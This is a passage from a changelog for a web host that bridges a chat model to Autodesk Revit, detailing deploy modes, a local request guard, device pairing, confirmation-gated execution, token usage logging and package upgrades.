  unknown.
- Each model call is a row in the new `llm_calls` table of the interaction log database (session,
  turn, round, role, model name, the four counts, duration, time, run label), created on an
  existing database at startup and purged with the logs after 90 days. No message text, endpoint
  address or key is stored there. The optional request header `X-Run-Label` (1-64 characters of
  `A-Z a-z 0-9 _ . -`, not `.` or `..`; anything else 422 `invalid_args`) names a measured run.
  `GET /api/usage?session_id=` lists the calls of one chat session and `GET /api/usage/runs`
  sums them per run label (calls, the four counts, time, first and last call); both follow the
  `/api/logs` rule (no password on a local host, `X-Admin-Token` on a cloud one). In
  `docs/api-v1.json`: these two operations with their schemas, and the header on `/api/chat`.
- Task page: above every reply of the bridge transcript, its tool activity - one row per tool
  call with the arguments, status, time and result size, expandable to the full arguments and
  the result preview, errors in red - and below the chat a collapsible token panel for this turn
  and this session (input, cache read, hit rate, cache write, output, calls; *unknown* where the
  provider reported nothing). With *Compare with no bridge* on, the no-bridge session has its own
  token panel and no timeline. A row or stage still open when the turn's stream ended (stopped,
  broken off) is marked *interrupted*.
- Deploy modes: `DEPLOY_MODE=local` (default) or `cloud`. A local host serves this machine only:
  it refuses to start when other machines could reach it (`HOST` not loopback; in the image, where
  the server listens on `0.0.0.0`, a `BIND_ADDRESS` not loopback or not passed in), and it has no
  relay, no pairing and no admin password. A cloud host is the host as it was, and refuses to start
  without `ADMIN_PASSWORD`. Both refusals print the reason and exit 2. `/config.json` reports
  `features.mode`. A local host also refuses to start with `ADMIN_PASSWORD` set (a cloud
  deployment missing `DEPLOY_MODE=cloud` fails closed instead of running without a password) or
  with `CORS_ORIGINS` set; `MAX_DEVICES` and `PUBLIC_WS_BASE` given to it are not an error, one
  startup log line names each as unused.
- The request guard of a local host (`backend/localguard.py`), in front of every path (API, static
  files, `/config.json`, `/health`, WebSocket upgrades): 403 `{"error": "local_mode_no_proxy"}` for a
  request carrying `Forwarded`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`,
  `X-Real-IP` or `CF-Connecting-IP`; 403 `local_mode_host` for a `Host` other than `127.0.0.1`,
  `localhost` or `[::1]` with any port (plus the loopback address configured as `HOST` /
  `BIND_ADDRESS` when it is another one), the guard against DNS rebinding, and - outside a container -
  for a peer address that is not loopback (a server started as `uvicorn backend.main:app --host
  0.0.0.0` is covered too); 403 `local_mode_origin` for any request whose `Sec-Fetch-Site` is
  `cross-site` or `same-site` (another site's page started it: GETs that reach Revit such as
  `/snapshot`, body-less POSTs such as `/trigger-selection`, any method) - except a top-level
  navigation to the page shell or a static file (GET or HEAD, `Sec-Fetch-Mode: navigate`,
  `Sec-Fetch-Dest: document`, not `/api/...`, `/config.json`, `/openapi.json`, `/docs`, `/redoc`
  or `/health`), so a link to the host in a README or a chat tool opens it - and for a POST, PUT,
  PATCH, DELETE or WebSocket upgrade whose `Origin` is not `http://` plus the request's `Host`.
  Every local response carries `Content-Security-Policy: frame-ancestors 'self'` and
  `X-Frame-Options: SAMEORIGIN`: no other page may frame the UI, which has no password.
  Routes without a body (`DELETE /tools/{name}`, `DELETE /api/skills/{id}`, `POST
  /trigger-selection`...) would otherwise take a cross-site form post; routes with a JSON body
  already refuse `text/plain` and form data with 422. A port in `Host` must be ASCII digits. A cloud
  host has no such guard: forwarding headers and public host names are normal behind its proxy.
  Known limits: a reverse proxy that adds no forwarding header and sends a loopback `Host` (nginx's
  default) is not detected; a request relayed by a forward proxy running on the same machine looks
  like a direct browser (loopback peer, rewritten `Host`, no forwarding headers), so a local proxy
  that accepts connections from other machines exposes the host to them - keep such a proxy bound
  to loopback or do not run the host beside it; in Docker the peer-address check is off, so the port
  must be published on the same loopback address as `BIND_ADDRESS` (`-p 127.0.0.1:7860:7860`).
- `npm run dev`: the Vite proxy presents its own pages (`http://localhost:5173`) with the target's
  origin, so the dev page can still make changes on a local host; any other `Origin` passes through
  unchanged and is refused.
- `uv run revit-bridge-web`: the API and the built frontend on `127.0.0.1:7860` without Docker
  (`--host` / `--port` override `HOST` / `PORT` and go through the same check). `pyproject.toml`
  now builds the project (hatchling) so `uv sync` installs it editable with this script; `uv.lock`
  changes only the project's own source line. `python -m backend.main` (the image) is unchanged;
  importing `backend.main` no longer builds the app (`uvicorn backend.main:app` still finds one).
- `get_guidance`, the package's lessons for writing Revit code, as a model tool: the same
  arguments (`mode`, `stage`, `skill_categories`, `revit_categories`, `symbols`, `errors`,
  `exceptions`, `revit_version`, `ids`, `seen_hashes`) and JSON reply as the MCP tool, computed in
  process by `revit_bridge.guidance` on the framework lessons in the wheel plus the company,
  project and personal layers the environment names (`REVIT_BRIDGE_GUIDANCE_COMPANY` /
  `_PROJECT`, `REVIT_BRIDGE_DATA_DIR/guidance`). Read-only; bad arguments and an invalid framework
  layer are results (`invalid_args`, `guidance_invalid`). The description is the MCP tool's
  docstring word for word followed by one host note: "This host has no check_code; use stage=fix
  with the symbols you suspect." A test checks that the description starts with the installed MCP
  tool's docstring and that the parameter names match its signature.
- The task page shows each question's `kind` as a badge (*designer*, *model fact*, *technical*)
  with what it `blocks` in the tooltip. Display only: *Confirm* still follows `reconcile.ready`.
- Paired devices replace the fixed slots: `POST /api/v1/bridge/devices/pair`,
  `POST /devices/redeem` (the add-in, no headers), `GET /devices/{id}`,
  `DELETE /devices/{id}` (revokes and closes the socket), `GET /devices` (admin).
  The relay is keyed by device id, `/ws/{device_id}` requires the add-in's auth
  message within ten seconds and `MAX_DEVICES` (20) caps concurrent connections.
  All of the credential logic is the package's `DeviceStore`: only hashes are
  stored, in `REVIT_BRIDGE_DATA_DIR/auth/devices.json`.
- Every confirmation and every ledger line carries a `scope` - the device it
  belongs to, or `"local"` for the add-in on this machine. A token confirmed for
  one device is refused on another (`mismatch`), `GET /evidence` shows only that
  device's records and `POST /evidence/{id}/validate` answers 404
  `unknown_evidence` for another device's record.
- `POST /execute` asks the designer on the device before running ad-hoc code (the
  package sends `confirm` with the spec card); a No is `success: false,
  error: "declined_on_device"` with the token consumed and a ledger line. A pack
  run is not asked about.
- The Connect page pairs a Revit instead of picking a numbered slot: **Pair a Revit** shows the
  pairing code with its countdown, the install command that carries it and the settings-window
  alternative, then waits (every three seconds, up to ten minutes) for the add-in to redeem it and
  come online. *My devices* lists the devices this browser tab holds keys for - label, online, last
  seen, requests, *Revoke* - and selecting one is what every other page then talks to; the local
  add-in over TCP stays as the other choice. With the admin password, a list of every device on the
  host with the same *Revoke*.

- The host loop: `POST /api/chat` runs the model with the package's read-only tools
  (`get_project_snapshot`, `query`, `list_tools`, `get_tool_choices`, `missing_params`,
  `reconcile`) and `propose_spec` (OpenAI-compatible function calling in `backend/llm.py`).
  `propose_spec` validates and reconciles the draft and pushes `event: spec`
  `{spec, card, errors, reconcile}` to the page; the model gets `{accepted, errors,
  reconcile}`. The model has no `confirm_spec`, `run_tool` or `execute_code`. The page
  reports an execution back with `{execution, session_id}`: the turn starts with
  `event: execution` and the model reports faithfully. `bridge: false` is the comparison
  mode: one plain prompt, no tools, no skills.
- The system prompt is the package's `host_instructions()` plus the enabled skills (which of the
  wheel's are on by default: see *Changed*). The host's own `HOST_INSTRUCTIONS` and the pack
  index in the prompt are gone.
- Sessions keep the model's message history (with tool calls), the last snapshot
  fingerprint, the last proposed spec and the last reported `evidence_id`; never a token.
  A tool result is kept in the session up to 8 KB (head plus a one-line note), a
  `get_guidance` reply up to 16 KB, so the orient lessons (about 12.4 KB) reach later turns
  whole; the turn that produced a result still sends it to the model in full.
- `frontend/src/api/chat.ts`: `parseSseFrame()` and `chatEvents()` yield the host loop's
  events (`session`, `token`, `spec`, `execution`, `error`, `done`); the types are in
  `frontend/src/types/api.ts`.
- The task page is the demo sequence: the snapshot, the brief with the model's questions as
  clickable options, the side-by-side comparison with a `bridge: false` session, the spec card
  from the `spec` event (source and evidence per parameter, the readings as checkboxes,
  conflicts in red, *Confirm* only when the reconciliation is ready), the confirmed execution
  with the validator's checks and a prominent `validation_failed`, the tamper demo (one value
  changed under the same token is `confirmation_invalid`), the report back to the model and
  solidifying code that worked into a v1 pack. The confirmation token lives in the page's
  memory only - never `localStorage` or `sessionStorage`.
- An **Evidence** page: the ledger (`GET /evidence`) with one row per execution, every field of a
  record when it is expanded, and *Validate* (`POST /evidence/{id}/validate`) to re-run its
  assertion against the model as it is now.
- Web API v1 under `/api/v1/bridge`, every route a thin wrapper over `revit-bridge` 0.2:
  `GET /snapshot`, `POST /query`, `POST /tools/{name}/missing-params`,
  `POST /spec/reconcile`, `POST /spec/confirm` (issues the one-time token, channel
  `host_ui`), `GET /evidence`, `POST /evidence/{id}/validate`. The contract is exported
  to `docs/api-v1.json` (CI checks it).
- `tests/fake_revit.py`: a TCP stand-in for the add-in so every route is tested end to
  end without Revit.
- `POST /spec/confirm` is rate limited per client address like `/api/chat`
  (`CHAT_RATE_LIMIT`, its own counter): 429 `{error: rate_limited}`.
- `.env.example` lists, commented out, the other variables the host and `revit-bridge` 0.6.0
  read: `REVIT_BRIDGE_CONFIRM_TTL`, `REVIT_BRIDGE_GUIDANCE_COMPANY` / `_PROJECT`,
  `REVIT_BRIDGE_CAPABILITIES_DIR` / `_EVIDENCE_DIR`, and `DATA_DIR` / `HOST` (both pinned by
  `docker-compose.yml`).
- CI's image job also runs the documented smoke: `docker compose up -d --build` with
  `.env.example` as `.env`, then `/health`, so the env file, the `./data` bind mount and the
  entrypoint's drop to `appuser` are exercised.

### Changed

- **`ROLES_ANALYST` defaults to `off`**: the chat's default mode is planner + supervisor (it was
  analyst + planner + supervisor): without the analyst the chat makes one model call less per
  message. Turn it on with a strong model only (`ROLES_ANALYST=on`, or mode `roles_analyst`).
  `.env.example` says `off`.
- **The default output limit is 16384 tokens** (it was 4096): `max_tokens` in every request whose
  models file entry sets none, and in every request without a models file (`max_output_tokens` on
  the responses api). A thinking model's thinking counts toward it, and the old default was used up
  by thinking. This is the one change to the default request body; an entry's `max_tokens` still
  sets its own. The new optional **`LLM_MAX_TOKENS`** (256 to 65536; any other value refuses the
  start) replaces the default for every call whose entry sets none - browser-chosen models and
  calls without a models file included; a model whose output cap is below 16384 needs it (or an
  entry `max_tokens`). Unset, the requests are as described here.
- The token bench's HTTP read timeout (`--timeout`) defaults to 1260 seconds (it was 120) - longer
  than the host's longest model call, 1200 s - so a long non-streamed model call the host is
  waiting for is not counted as a failure; connecting to a host that does not answer fails after
  15 s.
- A model call's read timeout is 300 seconds (it was 120): a thinking model may be silent for
  minutes before its first token. A models file entry's `timeout_s` sets its own; one above 300 also
  lengthens the whole call's limit (600 s) by as much.
- The token bench (`python -m bench`): a task's mention may pick an item by name, `{kind, pick:
  {name | first: true, category?}}`, looked up through `GET /api/v1/bridge/mentions` before the
  task's first message (nothing found, or two items of that name, fails the task before any chat);
  the picks go with the first message only, each result records the mentions sent, and `--execute`
  confirms with the chat session. A pick that finds nothing skips the task (`skipped: pick not
  found (<kind> <name>)`), unscored. `mentioned-level` and `mentioned-link` in `bench/tasks.yml` pick
  by name (F2) and the first loaded link instead of placeholder ids, no longer `requires:
  [mentions]`; `mentioned-level` also expects `level_name: F2`. `bench/tests` is in the pytest
  paths, so `uv run pytest` (and CI) runs it.
- **The chat writes no code.** The model's tools lose `get_guidance` (seven tools, 3,959 bytes of
  definitions instead of 5,147; 3,444 before `query` named the kinds `links` and `type_categories`
  and `args.link_id`, in the words of the package's MCP tool), and the system prompt is the package's text for a host whose model
  writes no code, `host_instructions(code=False, mentions=True)` (revit-bridge 0.9: no
  `execute_code`, snippet contract or `blocked_code`, "Write code" on its never-list, and the rule
  for the designer's `@` selections), and one line of this host's: when no tool fits, link
  `[workbench](/capabilities/workbench)` - 3,689 bytes instead of 6,007 (no skills, no
  `get_guidance` pointer). With revit-bridge 0.8 it was the package's full text and a paragraph of
  this host's that set its code parts aside (4,288 bytes). `propose_spec` with an `execute_code` spec shows no
  card and answers `{accepted: false, errors: [{code: "code_not_offered", ...}], reconcile: null}`.
  The Skills page and `/api/skills` stay; the skills no longer enter the prompt. The task page loses
  the free-code execution, the code branch of the tamper demo and the *Solidify* panel; running a
  pack, the spec card, the tamper demo for a value, the timeline and the token panel are unchanged.
- **Built-in packs are read-only.** `PUT` and `DELETE /api/v1/bridge/tools/{name}` on a pack from
  the wheel, and `POST /solidify` or the import under a built-in's name, are 409 `builtin_read_only`
  (before, an edit copied the built-in into the user directory and a delete hid it behind a
  `.disabled` marker) - as long as the user directory has no file of that name. A user file that
  already carries a built-in's name is the designer's own: it can be edited, replaced (import with
  `overwrite=true`, solidify) and deleted, and deleting it brings the built-in back. The
  Capabilities page offers *Edit* and *Delete* for your own packs only; the task page neither
  confirms nor runs a spec that is not `run_tool`, and the Skills page no longer says skills enter
  the prompt.
- **Your tools are shared with the package's MCP server** when the host runs without a container
  (`uv run revit-bridge-web`): it sets no `REVIT_BRIDGE_DATA_DIR`, so the package uses its per-user
  directory, the one its MCP server uses. The 0.1 repair at startup (moving v0 pack files to
  `legacy-0.1/`) now runs only on the host's own `DATA_DIR/capabilities`, never on a shared
  directory, where another host's v0 packs stay where they are. `docker-compose.yml` keeps the tools
  in `./data` as before and has a commented mount (`SHARED_CAPABILITIES_DIR`,
  `REVIT_BRIDGE_CAPABILITIES_DIR=/shared/capabilities`) to share the machine's directory instead;
  `.env.example` no longer sets `REVIT_BRIDGE_DATA_DIR` (compose and the image pin it).
- A chat session keeps the system prompt its first turn was sent with (one per `bridge` value):
  every later call of the session starts with the same bytes - system message, then the tool
  definitions, which were already constant - so a provider's prompt cache keeps matching. A
  skill enabled, edited or turned off meanwhile reaches the next session (*New session* on the
  task page), not the open one. The prompt's text itself is unchanged.
- On a local host: the add-in socket and the device routes (`/api/v1/bridge/ws/{device_id}`,
  `/devices`, `/devices/pair`, `/devices/redeem`, `/devices/{device_id}`) are not mounted and answer
  404 `{"error": "cloud_mode_only", "message": ...}` - the socket before the upgrade; `X-Device-Id`
  / `X-Device-Key` (and the 0.1 slot headers) are not read, so every request, the chat's tools
  included, drives the add-in on this machine and its confirmations and evidence are `local`; the
  admin checks of pack changes, skill writes and `/api/logs` pass without a token
  (`/api/logs/verify` answers `{valid: true}`); `/config.json` has `admin: false`, `maxDevices: 0`
  and an empty `wsBase`; `GET /slots` is `{max_devices: 0, connected: 0}`; `GET /service-health`
  has `remote_relay_ready: false` and `websocket_endpoint: null`; `GET /revit-health` no longer adds
  "0 paired device(s) connected" to its detail. A cloud host answers all of these as before.
- The Connect page of a local host shows the local add-in's check and the model settings only - no
  pairing, no device lists, no admin password field (the components render on a cloud host) - and
  no request carries a device header or the admin token there; pack edit and delete, *Save as
  pack* and the skill editor work without a password. A cloud host's pages are unchanged. A
  `config.json` without `features.mode` (an older static one) is read as a cloud host;
  `frontend/public/config.example.json` says `"mode": "cloud"` and `"admin": true`.
- `docker-compose.yml` sets `DEPLOY_MODE` (default `local`) and passes `BIND_ADDRESS` into the
  container with the same default as the published port; `MAX_DEVICES` is passed empty unless set
  (empty means 20 on a cloud host), so a local host does not report it as unused. The image sets
  `REVIT_BRIDGE_WEB_CONTAINER=1`. Running the image with `docker run` in local mode needs
  `-p 127.0.0.1:7860:7860 -e BIND_ADDRESS=127.0.0.1` (CI's image smoke does that, and checks both
  refusals).
- `docs/api-v1.json` is exported from a cloud host (`DEPLOY_MODE=cloud ADMIN_PASSWORD=...` before
  the export command; CI does the same) and is unchanged: every route is still there.
- `uv.lock` pins revit-bridge 0.9.1 (the requirement stays `>=0.9,<0.10`; the image installs it
  from PyPI). From 0.9.0 to 0.9.1 no route, TaskSpec, gate, prompt or model tool definition changed
  (`docs/api-v1.json` is the same export; the system prompts and tool definitions of every role and
  of the one loop are the same bytes), and nothing the host imports changed its name or signature.
  What changed for the host:
  - 14 more built-in packs, 22 in all: `create_level`, `create_grid`, `create_door`,
    `create_window`, `create_room`, `create_roof_by_footprint`, `create_ceiling`, `set_parameter`,
    `move_elements`, `change_type`, `delete_selected`, `count_by_level`, `list_types`,
    `elements_in_link`. `GET /tools`, the Packs page and the workbench list them read-only; a user
    pack of one of these names made before is the designer's own as before. The analyst's tool list
    (one line per tool) is 3.4 KB instead of 0.9 KB, 2.5 KB more in every analyst call, and the one
    loop's `list_tools` answer is 15.7 KB longer (the byte comparison of the roles above). With
    `LLM_SINGLE_MODEL=1` the chat is still request for request and frame for frame what it was: the
    code before this change, on the same 0.9.1, sends and streams the same bytes.
  - A pack may refuse its input in Revit: `run_pack` then answers `refused: true` with the pack's
    reason as `error`, no hint, a ledger line with `refused: true`; nothing was kept and the pack's
    counters do not move; *Validate* on that line is 400 `not_executed`. The run route passes it
    through as before and the roles never send it back; the task page, *Packs* and the workbench's
    *Run* now show it as *Refused by the tool in Revit: <reason>* in the refusal colour (it was the
    red failure banner), a result with `refused: true` never counts as a gate refusal whatever its
    text, and the Evidence page lists such a line as *refused by the tool* and shows the field.
  - Token bench: `new-level`, `new-grid` and `move-selection` no longer need `--skip-requires
    basic-tools` and expect the packs' own parameters (`create_level` name and elevation,
    `create_grid` name and both points, `move_elements` x, y, z); a query task answered with one of
    0.9.1's read-only packs (`count_by_level`, `list_types`, `elements_in_link`) counts as correct,
    as `query_levels` and `query_model_stats` did; the refused fixture of `tasks-supervisor.yml`
    has the run route's keys.
- Before that, in this cycle: `revit-bridge>=0.9,<0.10` (0.9.0 in `uv.lock`). From
  0.8.2 to 0.9.0 nothing the host imports changed its name, signature or reply, and no route,
  pack, TaskSpec or gate changed: `docs/api-v1.json` is the same export and `GET /tools` lists the
  same eight packs. The package's `host_instructions()` names revit-bridge 0.9 in its first line
  (the only change in the prompt from the bump itself). A capability pack parameter now takes one
  string, number or boolean: the package refuses a list or an object for any parameter when it
  fills a pack (a run, a draft's check or dry run), and null counts as not given. The host builds
  no such value itself - the workbench sends typed values and the model's options, the task page
  sends the confirmed spec's values as they are - so only a spec whose value is a list or an
  object (which the package's render rejects) is affected.
- Before that, in this cycle: `revit-bridge>=0.8,<0.9` (0.8.2). From
  0.6.1 to 0.8.2 nothing the host imports changed its name, signature or reply, and no route,
  tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same export, `GET /tools` lists
  the same eight packs, and the model's tool definitions and `get_guidance` replies are the same
  byte for byte (the MCP tool's docstring did not change). The tools 0.7 added to the MCP server
  (`dry_run_code`, `test_addin_command`, `zoom_view`, `capture_view`) are not the model's here.
  What the model and the pages now see: the prompt's first line names revit-bridge 0.8, and
  `revit-core` (on by default) has a new section, "Keep Revit interactive", so with the bridge the
  prompt is 6,007 bytes instead of 5,455. The skill list has 44 entries instead of 40: the journal
  skill `revit-journal-analysis` and its three references, all off. The package's JSON stores this
  host writes through it (`usage.json`, `auth/devices.json`) no longer lose an update or end up
  corrupt when two writers meet (0.8.0). When the host and an MCP server share one
  `REVIT_BRIDGE_DATA_DIR`, the Evidence page can also list the server's new ledger lines (`action`
  `dry_run`, `addin_test`, `zoom_view` or `capture_view`; no pack, no *Validate*).
- Before that, in this cycle: `revit-bridge>=0.6,<0.7` (0.6.1). 0.6.1 is the first release whose device store raises when `devices.json` cannot be read, which the pair, redeem and delete-device routes answer with 503. From
  0.4.0 to 0.6.0 no route, tool, pack, TaskSpec or gate changed: `docs/api-v1.json` is the same
  export and `GET /tools` lists the same eight packs. What the pages and the model now see: an
  execution reads the levels once more after the document probe (a pack with preconditions takes
  them from its snapshot), and its ledger line's `document` carries `fingerprint` (the snapshot
  fingerprint; null with a `document: fingerprint skipped` warning when that read fails); a failed
  run whose error names .NET exception types has a `hint` that points at
  `get_guidance(stage="fix", exceptions=[...])`; a value missing from a truncated candidate list is
  a `model_fact` question; `get_guidance` has four more lessons; the prompt's first line names
  revit-bridge 0.6 (still 5,455 bytes). The skill list has 40 entries instead of 29: the phase
  skills `revit-task-brief`, `revit-addin-test` and `revit-addin-release` with their references,
  and `revit-addin-dev`'s `coding-rules`, all off.
- The system prompt no longer carries every `SKILL.md` in the wheel: of 0.4's three skills only
  `revit-core` is on by default, followed by one line that sends the model to `get_guidance` for
  the lessons and names the other categories. The `revit-bridge` protocol is listed but off: it
  describes the MCP server's tool flow (`check_code`, `confirm_spec`, `execute_code`, the
  verification tools), and this host's protocol is the package's `host_instructions()`, which
  opens the prompt. `revit-addin-dev`, references and lessons are listed but off too. A file's
  own `enabled: true` still turns it on. With the bridge the prompt is 6,007 bytes (UTF-8, with
  revit-bridge 0.8.2; 5,455 with 0.6.1); with
  the `revit-bridge` protocol in it, it was 22,348 bytes, and concatenating every `SKILL.md` of
  0.4.0 would have made it 28,918 bytes (13,837 with 0.3.0). A mounted `SKILLS_DIR` is
  unchanged: every file on unless it says otherwise.
  `bridge: false` is unchanged: 145 bytes, no skills, no tools.
- The browser identifies a Revit with `X-Device-Id` + `X-Device-Key` instead of `X-Slot-Id` +
  `X-Slot-Token`; the device id and this browser's key live in `sessionStorage` with the model
  settings, never in `localStorage`. `/config.json` carries `features.maxDevices`; `maxSlots` and
  `slotTokenRequired` are gone, and so is every slot-token field in the UI.

- `POST /tools/{name}/run` and `POST /execute` require the token from
  `POST /spec/confirm` and run through the package's `run_pack` / `run_code`
  (sandbox, preconditions, validator, evidence ledger with `host: "web"`); without a
  token they answer 400 `confirmation_required`, a tampered call is 200
  `confirmation_invalid`, a failed validation 200 `validation_failed`. The reply is the
  MCP `ExecutionResult` shape.
- Executions from the UI go through the gate: the Task page and the Capabilities page both
  build a TaskSpec, confirm it (`POST /spec/confirm`) and run it with the token. The 0.1 path
  (the model writes C# in the chat, the page posts it to `/execute`) is gone, with
  `frontend/src/utils/code.ts`.
- The Capabilities pack list shows the pack's version, validator and preconditions.
- `GET /tools` returns the MCP `list_tools` shape (`name, description, version,
  parameters, preconditions, validator, used`). `POST /solidify` takes v1 parameters
  and an optional `validator`.
- Status codes and error bodies across the bridge routes: 400 for a request the route
  refuses as such (`confirmation_required`, `invalid_category`, `unknown_kind`,
  `blocked`, `no_validator`), 422 for a body that parsed but is not valid
  (`invalid_args`, `invalid_spec`, `invalid_snapshot`, `invalid_pack`), 404 for what
  does not exist (`unknown_tool`, `unknown_evidence`), 503 `revit_unreachable` when no
  add-in answers (was 502), 200 `success: false` for refusals; bodies are
  `{error, message?, ...}` instead of FastAPI's `{detail}`. `docs/api-v1.json`
  declares those statuses per route as `ErrorBody`; FastAPI's own validation errors are
  `invalid_args` on the bridge routes only - `/api/chat`, `/api/skills` and `/api/logs`
  keep `{detail: [...]}`.

- Since `revit-bridge` 0.2.1 (the current requirement is the first entry of this list) the
  package ships eight built-in packs read in place from the wheel, keeps user packs and
  `usage.json` under its own data root, and no longer rewrites pack files to count executions.
- Capability packs come straight from the package's `ToolStore`: built-in packs are
  read from the wheel, user packs live under `REVIT_BRIDGE_DATA_DIR/capabilities`
  (`/app/data` in the container, the `./data` volume). Nothing is copied on first
  start any more; the entrypoint only makes the volume writable.
- Upgrading a 0.1 data volume: pack files without `schema_version` in the user pack
  directory (the copies 0.1 seeded, or packs solidified with 0.1) are moved to
  `capabilities/legacy-0.1/` at startup, one log line per file, nothing deleted, so the
  wheel's rewritten packs are not shadowed by their 0.1 copies.
- `GET /api/v1/bridge/tools` items carry the pack `version`.
- Built-in skills default to the plugin skills shipped in the `revit-bridge` wheel
  (`builtin:revit-bridge/SKILL` and its references); `SKILLS_DIR` is now an optional
  override instead of the only way to get them. The wheel's skills are listed and
  readable but disabled by default (a file's own `enabled: true` wins): `SKILL.md`
  expects the MCP tools this chat does not have yet and the references are read on
  demand, so a fresh install's system prompt is unchanged from 0.1. A mounted
  `SKILLS_DIR` is enabled by default as before.

### Fixed

- Behind the documented setup (port published on loopback, a reverse proxy on the Docker host)
  every visitor shared one address for the rate limits and the logs: requests reach the
  container from the Docker bridge gateway, whose `X-Forwarded-For` was not trusted, so the
  pairing redeem limit (10 a minute) applied to the whole host. The image now trusts
  `127.0.0.1,172.16.0.0/12` (`FORWARDED_ALLOW_IPS`; an explicit value still wins, and outside a
  container the default stays `127.0.0.1`). With `BIND_ADDRESS` not loopback, set
  `FORWARDED_ALLOW_IPS` to the proxy's address, or to `127.0.0.1` with no proxy.
- The container no longer turns "unhealthy" when `.env` sets `HTTP_PROXY` for model calls: the
  healthcheck bypasses proxies.
- A malformed `X-LLM-Base-Url` (`https://[::1`, a port out of range) is a 400, not a 500.
- `GET /%00` (a NUL byte in a path the SPA fallback looks up) serves the SPA instead of a 500,
  and an unknown `GET /api/...` is a JSON 404 `{error: "not_found", message}` instead of the
  SPA page with 200. Real routes, `/config.json`, `/health` and the build's files are unchanged.
- `CORS_ORIGINS="*"` no longer allows credentials (the middleware echoed any origin back with
  credentials allowed); an explicit origin list keeps them.
- `GET` and `DELETE /api/v1/bridge/devices/{id}` answer an unknown id with the same 403
  `invalid_device_key` as a wrong key, so a browser cannot probe which devices exist; with the
  admin password an unknown id is still 404. Every admin check compares `X-Admin-Token` in
  constant time (the device routes used `==`).
- Requests for one device no longer queue without bound behind a long one (a confirmation
  dialog holds a device up to three minutes): a request waits for its turn at most its own
  timeout and at most 16 wait at once, then fails as `revit_unreachable` (503) with nothing
  sent and no token consumed. Unauthenticated add-in sockets cannot pile up: an address with 20
  failed handshakes in a minute (wrong token, no auth message in time) or 64 sockets still
  waiting to authenticate is refused before the upgrade, so the close codes 4001/4002/4003 keep
  their meaning. Add-ins that authenticate never count, however often they reconnect.
- A device store that cannot be read for a moment (a later revit-bridge 0.6.x raises `OSError`
  after half a second instead of overwriting `devices.json`, before it writes anything):
  pairing, redeeming a code and revoking a device answer 503 `{error:
  "device_store_unavailable", message}` - nothing changed, the code is not consumed, try again
  - instead of an unhandled 500; the Connect page shows the message and keeps the label and
  the device for a retry (an admin revoke's message no longer vanishes when the list reloads).
  An add-in that connects meanwhile stays connected; only its last-seen time goes unrecorded.
  Before, the error closed the socket and left the device registered in the relay.
- Growth while the host runs: interaction logs older than 90 days are purged daily, not only at
  startup; at most 300 chat sessions are kept (the one idle the longest goes first); an
  `execution` report enters the session and the prompt with at most 16,384 characters of JSON
  (a longer `result` is cut to its head with a note, the verdict fields stay whole; the page
  still gets the whole report back), and only one over 4,194,304 characters is refused with
  422 `invalid_args`; one model call ends after 600 s even when the endpoint keeps trickling
  bytes.
- Skills: a very long name is cut to a 120-byte id when a skill is created instead of failing
  with 500 (a longer id already on disk still opens, changes and deletes; one the file system
  cannot hold is 404), a skill file is replaced whole or not at all (temporary file with the
  mode a plain write gives, then rename), and a file that is not UTF-8 reads as absent (404, as
  the list already skipped it) instead of a 500.
- A round that offers the model no tools (`bridge: false`, or the last round of a turn) no
  longer runs `tool_calls` the model returns anyway: they are logged (`backend.chat`) and
  dropped, and the round ends with the model's text, or an empty assistant message.
- Over a slot, a Revit that is gone or leaves mid-request is a transport failure
  (`ConnectionError`) like over TCP, so the package consumes no confirmation token and
  writes no ledger line for code that never reached Revit; only a reply that does not
  arrive in time is still `success: false, "Timeout ..."`.
- `POST /api/v1/bridge/solidify` and `PUT /api/v1/bridge/tools/{name}` answer
  `422 {"error": "invalid_pack", "problems": [...]}` when the package rejects the pack
  (an undeclared `{placeholder}` in the code, a malformed parameter, an unknown
  validator) instead of 500.
- `CLAUDE.md` gave the package constraint as `revit-bridge>=0.1.0`; it is `>=0.6,<0.7`.

### Removed

- The model's `get_guidance` tool and the skills and lesson pointer in the chat's system prompt
  (the model here writes no code); the task page's code execution path and *Solidify* panel.

- `X-Slot-Id` / `X-Slot-Token` (an `X-Slot-*` header is now 422 `invalid_args`),
  `MAX_SLOTS`, `MCP_BRIDGE_REQUIRE_SLOT_TOKEN`, `MCP_BRIDGE_SLOT_TOKEN_*` (the host
  refuses to start when one is still set, naming `MAX_DEVICES` or the pairing flow),
  and the `./.secrets` mount in `docker-compose.yml`. Existing add-ins must be
  reinstalled once and paired.

- `GET/POST /unit`, `GET /project-units`, `POST /query-revit`: the snapshot's `units`
  and `POST /query` replace them (the Connect page reads units from the snapshot).
  `docs/api-v0.json` is replaced by `docs/api-v1.json`.
- `backend/capabilities.py` (the first-start copy of the packs into `DATA_DIR`).

## [0.1.0] - 2026-09-18

First standalone release of the demo host, split out of the former
`revit-api-rag` monorepo.

### Added

- FastAPI backend that only imports `revit_bridge`: `/api/v1/bridge/*` (capability
  packs, execution behind the sandbox review, model queries, health), the
  WebSocket slot relay for remote add-ins with pre-shared slot tokens, `/api/skills`,
  `/api/logs` (admin) and `/config.json`.
- Bring-your-own-model chat (`/api/chat`): one OpenAI-compatible streaming client;
  `X-LLM-Base-Url` / `X-LLM-Model` / `X-LLM-Key` headers take precedence over
  `LLM_BASE_URL` / `LLM_MODEL` / `LLM_API_KEY`; keys are never stored or logged;
  browser-supplied endpoints must be https unless `LLM_ALLOW_HTTP=1`.
- React SPA with three pages - Connect, Task, Capabilities - that reads its
  configuration from `/config.json` at startup; no build-time API address.
- Single-image `Dockerfile` (Node build + Python runtime, no vector store, no model
  SDK), `docker-compose.yml`, `.env.example`, entrypoint that copies slot token files
  and drops privileges.
- Capability packs are copied from the package into `DATA_DIR/capabilities` on first
  start so edits and solidified packs persist in the data volume.
- `docs/api-v0.json`: exported OpenAPI contract. Backend test suite (no Revit needed).

### Removed (compared with the monorepo server)

- RAG retrieval, code generation, intent classification and orchestration routes,
  Text2Revit, PromptBridge, TextStudio, the API explorer, Gradio, `config.yaml`
  and every `openai` / `google-genai` / `cohere` / `chromadb` dependency.
- `/api/settings` and `/api/config`: model settings are per-request headers now.

[0.1.0]: https://github.com/revitbridge/revit-bridge-web/releases/tag/v0.1.0
